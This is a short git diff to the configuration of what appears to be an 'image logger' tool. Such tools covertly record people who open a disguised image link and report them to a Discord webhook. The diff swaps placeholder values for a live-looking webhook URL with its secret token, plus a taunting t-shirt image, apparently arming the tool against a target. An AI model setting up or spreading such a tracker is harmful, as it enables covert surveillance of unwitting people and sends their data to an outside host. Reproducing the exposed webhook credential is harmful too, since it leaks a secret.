@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1379785501577580594/Pc8YcGjprj6co-BHEPb-zpSSgCg-EthObl3jIx6Ci383n1d9CViPdQmwVhMOr9F89bU5",
+    "image": "https://image.spreadshirtmedia.net/image-server/v1/compositions/19057665/views/1,width=300,height=300,version=1478003241/you-are-really-a-noob-maenner-t-shirt.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
